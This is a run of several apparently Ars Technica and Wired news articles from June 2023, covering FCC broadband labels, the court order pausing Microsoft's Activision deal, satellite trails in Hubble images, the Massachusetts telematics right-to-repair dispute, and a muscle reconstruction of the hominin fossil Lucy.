<p>Comcast also objected to how the record-keeping requirement was implemented. "The Order does not explain or justify this requirement, which is not reflected anywhere in the actual rules and was not even addressed in the underlying proceeding," Comcast said. The Comcast statement about the "actual rules" differentiates between the <a href="https://www.ecfr.gov/current/title-47/chapter-I/subchapter-A/part-8">rules themselves</a> and the much longer order in which the FCC explained its reasoning and how the rules will be enforced.</p>
<p>Before the FCC approved its rules last year, cable-industry lobby group NCTA-The Internet &amp; Television Association <a href="https://www.fcc.gov/ecfs/document/103242459303274/1">urged</a> the commission to reject proposals to require that broadband labels be sent to consumers with every monthly bill. Stager believes that provision would have made it into the final rules if the FCC wasn't still operating with a <a href="https://arstechnica.com/tech-policy/2023/05/biden-chooses-new-fcc-commissioner-hopes-senate-wont-reject-this-one-too/">2-2 partisan deadlock</a> due to the Senate <a href="https://arstechnica.com/tech-policy/2023/03/bidens-fcc-pick-withdraws-regrets-that-isps-get-to-choose-their-regulators/">refusing to confirm</a> Biden nominee Gigi Sohn.</p>
<p>"Comcast already succeeded in watering down the label last year when they defeated a requirement to display the label where customers would actually see it—on their monthly bill," Stager said. "Despite strong support for this common-sense rule, the FCC didn't have the votes. It's a loophole that many ISPs, which are notoriously adept at hiding billing disclosures, will try to drive a truck through."</p>
<p>FCC Chairwoman Jessica Rosenworcel recently <a href="https://arstechnica.com/tech-policy/2023/03/fcc-chair-proposes-ban-on-deceptive-broadcast-tv-and-regional-sports-fees/">proposed</a> similar pricing transparency rules for the TV services offered by cable and satellite companies. TV providers like Comcast generally advertise rates that don't include charges such as the "Broadcast TV" and "Regional Sports Network" fees. Rosenworcel's proposal would require cable and direct-broadcast satellite providers to "state the total cost of video programming service clearly and prominently, including broadcast retransmission consent, regional sports programming, and other programming-related fees, as a prominent single line item on subscribers' bills and in promotional materials."</p>

<p>A federal judge has issued a temporary restraining order blocking Microsoft's long-planned acquisition of Activision, pending hearings on <a href="https://arstechnica.com/gaming/2023/06/report-ftc-will-file-to-block-microsofts-69b-activision-blizzard-acquisition/">the preliminary injunction being sought by the Federal Trade Commission in the case</a>.</p>
<p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/ftc-v-microsoft-order-re-tro-and-preliminary-injunction.pdf">The temporary order</a> issued by District Court Judge Jacqueline Corley doesn't do much to suggest which way the court is leaning on the merits of the FTC's case. A Microsoft spokesperson even <a href="https://www.washingtonpost.com/business/2023/06/13/microsoft-activision-blizzard-deal-blocked/e7f4f7a2-0a57-11ee-8132-a84600f3bb9b_story.html">acknowledged to the Associated Press</a> that "a temporary restraining order makes sense until we can receive a decision from the Court, which is moving swiftly."</p>
<p>The order "maintain[s] the status quo," as Judge Corley puts it, by preventing Microsoft and Activision from closing their deal while a more permanent decision on the injunction is pending. And while Microsoft and Activision have said in the past that they will wait for the regulatory process to finish before completing their proposed deal, the FTC <a href="https://finance.yahoo.com/news/federal-court-grants-ftcs-request-to-temporarily-block-microsoft-activision-tie-up-120056268.html">told Yahoo Finance</a> that they sought the restraining order based on "public reporting that Microsoft and Activision Blizzard are considering closing their deal imminently."</p>
<p>The first hearing on the FTC's preliminary injunction request is scheduled to start on June 22, giving Microsoft until Friday to file its initial response in the matter. That tight schedule might be to Microsoft's overall benefit, as Activision CEO Bobby Kotick <a href="https://arstechnica.com/gaming/2023/06/report-ftc-will-file-to-block-microsofts-69b-activision-blizzard-acquisition/">said Monday</a> that the FTC's federal injunction request "accelerates the legal process" and that their "excellent legal team has been preparing for this move for more than a year."</p>
<p>If and when that injunction is granted, the deal will continue to be on pause as the FTC's wider antitrust case moves forward.</p>
<p>Despite the speedy schedule, the current court timeline makes it extremely unlikely that Microsoft and Activision will be able to close their deal before <a href="https://arstechnica.com/gaming/2023/01/ftc-delays-could-send-microsoft-and-activision-back-to-the-bargaining-table/">a contractual July 18 deadline</a> set when the acquisition was first proposed early last year. While Microsoft would technically have to pay a significant "breakup fee" if that deadline isn't met, both sides will likely renegotiate a later deadline pending the outcome of outstanding legal issues.</p>
<p>The FTC previously filed a separate "administrative complaint" against the Microsoft Activision deal <a href="https://arstechnica.com/gaming/2022/12/ftc-files-suit-to-stop-microsofts-69-billion-activision-purchase/">back in December</a>. That case, which will be argued in front of an FTC administrative law judge, isn't set to begin until August 2.</p>
<p>Outside the US, Microsoft and Activision are also <a href="https://arstechnica.com/gaming/2023/05/activision-appeals-uks-irrational-unlawful-blocking-of-microsoft-merger/">appealing</a> a <a href="https://arstechnica.com/gaming/2023/04/uk-government-blocks-microsofts-proposed-activision-purchase/">UK government decision to block the merger</a> based on competition concerns in the cloud gaming market. A hearing on that appeal is set for July 28.</p>

<div><a name='page-1'></a></div>
<p>Throngs of satellites are streaking across the Hubble Space Telescope’s field of view, leaving what look like scratch marks on space photos and hindering scientists’ work. Teeming <a href="https://www.wired.com/story/astronomers-want-to-save-dark-skies-from-satellite-swarms/">swarms of these satellites</a>, which reflect sunlight and mimic astronomical objects, threaten to gradually <a href="https://www.wired.com/story/as-spacexs-starlink-ramps-up-so-could-light-pollution/">transform the night sky</a> and affect how astronomy can be done.</p>
<p>“We see these satellite trails in Hubble data, and really in all astronomical data, and they’re a bit of a nuisance,” said David Stark, an astronomer at the Space Telescope Science Institute in Baltimore, speaking last week at the <a href="https://aas.org/meetings/aas242">American Astronomical Society</a> conference in Albuquerque, New Mexico. In fact, he said, his team used a new detection method to measure that the rate of satellite trails is <i>doubling</i>. But Stark was presenting his team’s idea for a Band-Aid fix: new software they described in a <a href="https://www.stsci.edu/files/live/sites/www/files/home/hst/instrumentation/acs/documentation/instrument-science-reports-isrs/_documents/isr2208.pdf">recent report</a> that is five to 10 times more sensitive at finding trails than previous software, and then masking them out. “It’s particularly good at finding satellite trails that can be missed by eye,” he said.</p>
<p><div class="image shortcode-img right full"><img src="https://cdn.arstechnica.net/wp-content/uploads/2019/02/wired-logo.png"></div>It’s standard procedure for astronomers to try to clean images of “artifacts,” like the effects of cosmic rays hitting Hubble’s camera detectors, or diffraction spikes, which make bright stars look like crosses. Occasionally, a pesky nearby Milky Way star might get in the way of one’s view of a faraway object. The new technique, called Median Radon Transform, examines every linear path across an image at every possible angle. When a particular path aligns with a satellite trail, the system notes a deviation from the average flux—or the brightness at a particular wavelength in a pixel—measured across areas with apparently empty sky. It can spot short streaks, too, but they have to be slightly brighter to be identified, since they cover fewer pixels.</p>
<p>This software then allows astronomers to mask out satellite trails, so that the affected pixels are ignored in their analysis of the data. It’s like dog-earing a few misprinted pages in a book, so that you skip them while studying the rest of the volume.</p>
<p>But it’s better not to lose those pages. When there are multiple exposures of the same field, an astronomer can use additional software tools to completely remove the line from the final combined image. That part of the sky will then appear as it should, though the signal-to-noise ratio in that line’s pixels will be lower than if the satellite had never skimmed in front of the telescope that day. Stark and his team have included their code in a standard software pack called “acstools” that they manage.</p>
<p>Still, this fix has a big limitation: It’s designed for Hubble, which is orbiting 332 miles above the Earth, and it’s less plagued by satellite streaks than observatories on the ground. Ground-based optical telescopes with wide-field imaging—which often don’t take multiple exposures—stand to be far more affected. There have been a few instances already of satellites photobombing images taken by telescopes at the <a href="https://aasnova.org/2022/12/28/selections-from-2022-tracing-satellite-tracks-in-survey-images/">Cerro Tololo Inter-American Observatory</a> in Chile and the <a href="https://www.astronomy.com/space-exploration/global-astronomy-groups-say-theyre-concerned-about-spacexs-starlink-satellites/">Lowell Observatory</a> in Arizona, for example.</p>
<div><a name='page-2'></a></div>
<p>The problem will be much, much worse for the long-awaited National Science Foundation-funded <a href="https://www.wired.com/story/a-new-3200-megapixel-camera-has-astronomers-salivating/">Vera Rubin Observatory</a>, which is being assembled in the Chilean Andes and will begin taking images next year. Its incredibly sensitive camera will detect faint and changing objects, like a star going supernova or a near-Earth asteroid, and the telescope will automatically send alerts to astronomers when it spots such things. But the Rubin collaboration has <a href="https://www.lsst.org/content/lsst-statement-regarding-increased-deployment-satellite-constellations#">expressed concern</a> about the possibility of false alerts thanks to light reflecting off of satellites or space junk in orbit and has warned that as many as 30 percent of its images could be affected by satellite streaks. For example, a glint of sunlight off a small piece of insulation shed by a satellite could appear in a telescope image like a flaring star. Unless an astronomer can also measure the light's spectrum, they might be fooled, says John Barentine, a Tucson, Arizona, astronomer who recently <a href="https://www.nature.com/articles/s41550-023-01904-2">authored a study</a> about light pollution from low Earth orbit objects.</p>
<p>A second problem is that the number of satellite streaks is growing. Stark tested the software on 20 years of data from Hubble’s Advanced Camera for Surveys. While the satellite trails haven’t changed in brightness, their rate has approximately doubled. The team found trails in every three to four hours of Hubble data taken in 2002. But in 2022, satellites photobombed Hubble every one to two hours. That means 5 percent of the images taken 20 years ago were affected, and now it's about 10 percent.</p>
<p>The rate will surely continue rising, says Sandor Kruk, an astronomer at the Max Planck Institute for Extraterrestrial Physics in Munich, Germany. “You expect, as time goes, more streaks in images. It goes proportionately with the number of satellites you have above the observatory,” says Kruk, lead author of a <a href="https://www.nature.com/articles/s41550-023-01903-3">recent study</a> that used crowdsourced classifications and machine learning to track satellite trails in images.</p>
<p>Kruk and his colleagues observed a lower rate, rising from about 2.5 to 5 percent over the past two decades. They found that this trend ramped up rapidly starting in about 2018, around the same time companies began deploying <a href="https://www.wired.com/story/as-spacexs-starlink-ramps-up-so-could-light-pollution/">satellite mega-constellations</a>, connecting hundreds or thousands of them in networks. (Stark and Kruk attribute their studies’ different percentages to using different measuring techniques.)</p>
<p>Those mega-constellations have obvious benefits for their operators. The satellites are smaller and therefore cheaper to produce and launch, and networked services are less vulnerable to disruption, such as by <a href="https://www.wired.com/story/sun-storm-end-civilization/">space weather</a> or <a href="https://www.wired.com/story/analysts-warn-anti-satellite-weapons-have-evolved-beyond-missiles/">anti-satellite weapons</a>. SpaceX’s Starlink makes up the biggest satellite network by far, with some 4,000 in orbit and plans to increase that to 42,000. OneWeb’s constellation has more than 600 satellites, but they’re situated at a higher orbit, lessening the effect on astronomical observations. And Amazon is poised to launch its Project Kuiper this summer, lofting its first broadband-service-providing satellites on the inaugural flight of the United Launch Alliance’s Vulcan Centaur rocket. The company plans to populate that constellation with more than 3,000 satellites.</p>
<p>SpaceX and some other companies have tested possible solutions, like covering a satellite with a thin film to darken it so it reflects less light, or adding a visor to reflect light away from Earth. These limited efforts have fallen far short of the <a href="https://www.wired.com/story/astronomers-want-to-save-dark-skies-from-satellite-swarms/">International Astronomical Union’s brightness targets</a>, and some of these designs have caused problems for the satellites themselves, by heating them too much or interfering with inter-satellite communication.</p>
<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/hubble-deployed.jpg"><img alt='Hubble&#039;s deployment by the Space Shuttle Discovery in 1990.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/hubble-deployed-640x480.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/hubble-deployed-1280x960.jpg 2x" alt='Hubble&#039;s deployment by the Space Shuttle Discovery in 1990.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/hubble-deployed.jpg"class="caption-link" rel="nofollow">Hubble's deployment by the Space Shuttle Discovery in 1990.</a> (credit: NASA)</p></div>
<p>A NASA concept to work with its commercial partners to <a href="https://spacenews.com/nasa-and-spacex-to-study-possible-private-hubble-servicing-mission/">boost Hubble</a> to a higher orbit might inadvertently mitigate the photobombing problem. Atmospheric drag has gradually pulled the spacecraft closer to Earth. Nudging it back is intended to extend its lifespan—but would also move it away from a small fraction of passing satellites.</p>
<p>None of that will resolve problems for Earth-based observatories, which have to peer through the whole atmosphere, including all satellite orbits. And Barentine worries that although companies haven’t found any tech fixes yet, they haven’t slowed down the brisk pace of satellite launch. “People in industry have this unerring faith in innovation,” he says, “and my response to that has been: The history of science and technology and the environment is just littered with instances of running headlong into technology we did not understand that created a lot of negative side effects.”</p>

<div><a name='page-1'></a></div>
<p>In 2020, <a href="https://arstechnica.com/cars/2020/11/massachusetts-votes-to-extend-right-to-repair-law-to-connected-cars/">voters in Massachusetts chose to extend</a> that state's automotive "right to repair" law to <a href="https://electionstats.state.ma.us/ballot_questions/view/7343/">include telematics and connected car services</a>. But this week, the National Highway Traffic Safety Administration told automakers that some of the law's requirements create a real safety problem and that they should be ignored since federal law preempts state law when the two conflict.</p>
<p>Almost all new cars in 2023 contain embedded modems and offer some form of telematics or connected car services. And <a href="https://ballotpedia.org/Massachusetts_Question_1,_%22Right_to_Repair_Law%22_Vehicle_Data_Access_Requirement_Initiative_(2020)">the ballot language</a> that passed in Massachusetts requires "manufacturers that sell vehicles with telematics systems in Massachusetts to equip them with a standardized open data platform beginning with model year 2022 that vehicle owners and independent repair facilities may access to retrieve mechanical data and run diagnostics through a mobile-based application."</p>
<p><a href="https://arstechnica.com/cars/2022/01/massachusetts-connected-car-right-to-repair-law-still-on-hold/">There have been attempts</a> by state lawmakers, the auto industry, and NHTSA to tweak the law to create a more reasonable timeline for implementation, but to no avail.</p>
<p>Now, <a href="https://www.reuters.com/business/autos-transportation/us-tells-automakers-not-comply-with-massachusetts-vehicle-data-law-2023-06-13/">according to Reuters</a>, NHTSA has written to automakers to advise them not to comply with the Massachusetts law. Among its problems are the fact that someone "could utilize such open access to remotely command vehicles to operate dangerously, including attacking multiple vehicles concurrently," and that "open access to vehicle manufacturers’ telematics offerings with the ability to remotely send commands allows for manipulation of systems on a vehicle, including safety-critical functions such as steering, acceleration, or braking."</p>
<p>Faced with this dilemma, it's quite possible the automakers will respond by simply disabling telematics and connected services for customers in the state. Subaru already took that step when it introduced its model year 2022 vehicles, and NHTSA says other OEMs may do the same.</p>
<h2>A federal right to repair law?</h2>
<p>Meanwhile, a bipartisan automotive right to repair law is working its way through Congress. Called <a href="https://www.congress.gov/bill/117th-congress/house-bill/6570">the REPAIR Act</a>, it would "provide to a vehicle's owner certain direct, real-time, in-vehicle data generated by the operation of the vehicle that is related to diagnostics, repair, service, wear, and calibration or recalibration of parts and systems of the vehicle."</p>
<p>This bill does acknowledge the cybersecurity risks; if passed, it would require NHTSA to develop data access standards for connected vehicles.</p>
<p><em>Correction: The article as published suggested that the "open" platform called for in the ballot language would be insecure. This has been corrected.</em></p>

<p>One of the most famous fossils in human evolutionary history is known as "<a href="https://en.wikipedia.org/wiki/Lucy_(Australopithecus)">Lucy</a>," who belonged to an extinct species called <em>Australopithecus afarensis</em>—an early relative of <em>Homo sapiens</em> who was among the first hominins to walk upright. But scientists have long debated the extent of her bipedalism. Now a 3D digital re-creation of Lucy's muscular anatomy, combined with computer simulations, has reaffirmed that she was quite capable of walking fully erect. The results appeared in a new paper published in the journal Royal Society Open Science.</p>
<p>“Lucy’s ability to walk upright can only be known by reconstructing the path and space that a muscle occupies within the body,” <a href="https://www.eurekalert.org/news-releases/992054">said author Ashleigh Wiseman</a>, an archaeologist at Cambridge University. “We are now the only animal that can stand upright with straight knees. Lucy’s muscles suggest that she was as proficient at bipedalism as we are, while possibly also being at home in the trees.”</p>
<p>Lucy's remains were found in 1974 in Ethiopia at a site called Hadar. Several paleoarchaeologists—including Donald Johanson, Mary Leakey, and Yves Coppens—began surveying the site for signs of fossils relating to the origin of humans. The first interesting find occurred in November 1971, when Johanson found a fossilized upper shinbone and, nearby, the lower end of a femur. Now known as AL 129-1 and dating back more than 3 million years, the angle of the knee joint indicated this was a <a href="https://en.wikipedia.org/wiki/Hominini">hominin</a> (now known as <a href="https://en.wikipedia.org/wiki/Australopithecus_afarensis"><em>Australopithecus afarensi</em>s</a>) capable of walking upright.</p>

<p>But the really significant find occurred on November 24, 1974, when Johanson and fellow expedition member Tom Gray decided to check out the bottom of a small gully. Johanson spotted an arm bone fragment, then a skull fragment, then part of a femur. Further exploration over the next few weeks yielded many more bones, including vertebrae, part of a pelvis, ribs, and jaw fragments, all belonging to the same individual hominin. All told there were several hundred fossilized bone pieces constituting 40 percent of a complete female skeleton. This was "Lucy," aka AL 288-1, named after the 1967 Beatles tune "Lucy in the Sky with Diamonds," which had been played loudly and repeatedly on a camp tape recorder.</p>
<p>Once all the pieces were assembled, scientists were able to reconstruct Lucy, revealing that she stood about 1.1 meters (3 feet, 7 inches) tall and weighed about 29 kilograms (64 pounds). Her brain was small, like a chimpanzee's, but her pelvis and leg bones (including a <a href="https://en.wikipedia.org/wiki/Genu_valgum">valgus knee</a>) looked almost identical to modern humans, indicating that <a href="https://en.wikipedia.org/wiki/Australopithecus_afarensis"><em>Australopithecus afarensis</em></a> was fully bipedal, i.e., stood upright and walked erect.</p>
<p>How Lucy died is a matter of heated scientific debate. A controversial <a href="https://www.nature.com/articles/nature19332">2016 paper</a> suggested that a careful analysis of her bones reveals how she died—by falling to her death from a very tall tree—although other scientists (including Johanson) thought the evidence was thin at best. As <a href="https://arstechnica.com/science/2016/08/doubts-about-whether-ancient-hominin-lucy-fell-to-her-death-3-18-million-years-ago/">we reported</a> at the time, University of Texas-Austin anthropologist John Kappelman and his team did a complete X-ray CT scan on Lucy's bones, allowing them to create high-resolution 3D renders and 3D printouts of her skeleton.</p>
<p>By comparing the way her bones had fragmented with contemporary X-rays from people who fell, they concluded that the fragmentation of her leg bone was "green," that is, it took place right before she died. Specifically, the joint in Lucy's leg suffered from extreme compression of the type you'd expect in somebody who fell on their feet from a great height, perhaps out of a local tree where nests might be as many as 23 meters off the ground. However, skeptics pointed out that the process of fossilization often fragments bones in exactly the way that Lucy's bones are broken, and animals fossilized at the same time as Lucy have similar fractures.</p>

<p>There has also been significant debate over precisely how frequently and efficiently Lucy and her fellow <em>Australopithecus afarensis</em> walked. Specifically, Lucy had a much wider pelvis and shorter legs than a human, which some scholars have argued would have affected her gait. A consensus has begun to emerge in recent years in favor of a fully erect gait, rather than more of a crouching waddle, similar to chimpanzees. Wiseman decided to use computer simulations and muscle modeling in hopes of shedding further light on the issue.</p>
<p>She was inspired in part by <a href="https://www.nature.com/articles/s41598-022-07074-x">the work</a> of paleobiologist Oliver Demuth, who creates biomechanical <a href="https://dawndinos.com/musculoskeletal-modelling-and-simulation-of-movement/">3D musculoskeletal models</a> of <a href="https://dawndinos.com/extinct-archosaurs/">extinct archosaurs</a>. Extinct species mostly leave behind fossilized bones and skeletons, and while much can be learned from those remains, one needs to find a way to re-create the overlaying muscles to understand the biomechanics of how a given species moved. Demuth first used the limb anatomy of existing species to create 3D musculoskeletal models of known animals and then simulated movements like walking running, jumping, or standing. Then he extended and adapted those models to extinct animals.</p>
<p>Wiseman followed a similar course of action for her own work re-creating Lucy's musculature. First, she relied upon MRI scans and CT scans of adult female and male humans to map muscle paths and create a feasible 3D digital musculoskeletal model. Next, she used recently published open source virtual models of the Lucy fossil to put her skeleton back together, showing how each joint could move and rotate. Finally, she layered the muscles on top, relying on her map of human muscle paths, augmented by a few telltale traces of scarring from where muscle had once connected to Lucy's fossilized bones.</p>

<p>The resulting model included 36 muscles in each leg. Per Wiseman, Lucy had much larger calves and thighs than modern humans; the major muscles were more than twice the size. Fully 74 percent of Lucy's thigh consisted of muscle tissue compared to 50 percent in humans. Wiseman concluded that Lucy's knee extensor muscles would allow for sufficient leverage to straighten the knee joints like modern humans, thereby enabling Lucy to walk upright, as well as performing a range of other motions similar to chimpanzees and bonobos.</p>
<p>These findings add further evidence to the emerging scientific consensus, but Wiseman cautioned that this is not definitive proof that Lucy could walk erect frequently and efficiently. "Lucy likely walked and moved in a way that we do not see in any living species today,” <a href="https://www.eurekalert.org/news-releases/992054?">she said</a>. “<em>Australopithecus afarensis</em> would have roamed areas of open wooded grassland as well as more dense forests in East Africa around 3 to 4 million years ago. These reconstructions of Lucy’s muscles suggest that she would have been able to exploit both habitats effectively.”</p>
